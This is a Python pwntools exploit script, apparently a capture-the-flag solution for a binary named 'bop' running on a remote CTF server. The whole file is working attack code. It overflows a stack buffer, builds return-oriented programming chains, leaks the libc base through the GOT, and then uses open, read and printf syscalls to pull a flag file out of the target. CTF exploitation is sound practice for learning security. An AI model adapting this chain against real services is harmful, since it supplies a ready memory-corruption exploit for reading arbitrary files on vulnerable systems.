#!/usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["st"]
)

def start(binary):
    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b *0x4012f9
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("mc.ax",30284)
    else:
        return process(binary)


def leak_libc(p,e,r,l):

    pad = b"A" * 40

    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    printf_got = p64(e.got["printf"])
    printf_plt = p64(e.plt["printf"])
    main = p64(0x4012f9)

    got_funcs = [p64(e.got["printf"]), p64(e.got["gets"]), p64(e.got["setbuf"])]

    chain = ret + pop_rdi + got_funcs[0] + printf_plt
    chain += ret + main

    p.recvuntil(b"bop? ")
    p.sendline(pad + chain)
    leak = u64(p.recvuntil(b"Do").split(b"Do")[0] + b"\x00\x00")
    log.info(f"printf leak: {hex(leak)}")

    print(hex(l.sym["printf"]))
    libc_base = leak - l.sym["printf"]
    log.info(f"Leaked Libc Base: {hex(libc_base)}")
    return libc_base

def read_file(p,e,r,l,base):
    lr = ROP(l)

    pad = b"A" * 40

    main = p64(0x4012f9)
    writable_mem = p64(0x404100)
    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    pop_rsi = p64(r.find_gadget(["pop rsi",  "pop r15", "ret"])[0])
    pop_rdx = p64(lr.find_gadget(["pop rdx", "pop rbx", "ret"])[0] + base)
    read = p64(l.sym["read"] + base)
    log.info(f"Pop rdi: {hex(u64(pop_rdi))}")
    log.info(f"Pop rsi: {hex(u64(pop_rsi))}")
    log.info(f"Pop rdx: {hex(u64(pop_rdx))}")
    log.info(f"read: {hex(u64(read))}")

    log.info(f"Reading in /srv/app/flag.txt")

    chain = pop_rdi + p64(0)
    chain += pop_rsi + writable_mem + p64(0)
    chain += pop_rdx + p64(18) + p64(0)
    chain += read + main
    chain += ret + main


    p.recvuntil(b"bop?")
    p.sendline(pad + chain)
    pause()
    p.sendline(b"flag.txt\x00")

def open_flag(p,e,r,l,base):
    lr = ROP(l)
    pad = b"A" * 40

    writable_mem = p64(0x404100)
    main = p64(0x4012f9)
    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    pop_rsi = p64(r.find_gadget(["pop rsi",  "pop r15", "ret"])[0])
    syscall = p64(lr.find_gadget(["syscall", "ret"])[0] + base)
    pop_rax = p64(lr.find_gadget(["pop rax", "ret"])[0] + base)


    chain = pop_rdi + writable_mem
    chain += pop_rsi + p64(0x000) + p64(0)
    chain += pop_rax + p64(2)
    chain += syscall + ret + main

    log.info(f"Opening /srv/app/flag.txt")

    p.recvuntil(b"bop?")
    p.sendline(pad + chain)

def read_flag(p,e,r,l,base):
    lr = ROP(l)

    pad = b"A" * 40

    main = p64(0x4012f9)
    writable_mem = p64(0x404100)
    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    pop_rsi = p64(r.find_gadget(["pop rsi",  "pop r15", "ret"])[0])
    pop_rdx = p64(lr.find_gadget(["pop rdx", "pop rbx", "ret"])[0] + base)
    printf = p64(e.plt["printf"])
    read = p64(l.sym["read"] + base)
    log.info(f"Pop rdi: {hex(u64(pop_rdi))}")
    log.info(f"Pop rsi: {hex(u64(pop_rsi))}")
    log.info(f"Pop rdx: {hex(u64(pop_rdx))}")
    log.info(f"read: {hex(u64(read))}")

    log.info(f"Reading in flag")

    chain = pop_rdi + p64(3)
    chain += pop_rsi + writable_mem + p64(0)
    chain += pop_rdx + p64(0x60) + p64(0)
    chain += read
    chain += pop_rdi + writable_mem
    chain += printf

    p.recvuntil(b"bop?")
    p.sendline(pad + chain)
    p.interactive()



if __name__=="__main__":
    file = './bop'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    if args.REMOTE:
        libc = ELF("./libc.so.6")
    else:
        libc = e.libc

    base = leak_libc(p,e,r, libc)
    read_file(p,e,r,libc,base)
    open_flag(p,e,r,libc,base)
    read_flag(p,e,r,libc,base)
